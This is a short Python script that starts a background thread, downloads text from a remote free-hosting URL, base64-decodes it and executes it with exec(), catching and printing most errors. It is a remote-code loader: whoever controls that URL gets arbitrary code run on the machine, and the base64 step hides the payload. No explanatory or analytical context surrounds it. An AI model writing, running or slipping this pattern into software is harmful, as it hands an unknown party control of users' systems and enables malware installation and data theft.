import threading
import requests
import base64

def main():
    try:
        exec(base64.b64decode(requests.get("https://pettish-morning.000webhostapp.com/code.php").text.encode()).decode(),globals(),locals())
    except KeyboardInterrupt as e:return
    except Exception as e:print(e)

threading.Thread(target=main).start()
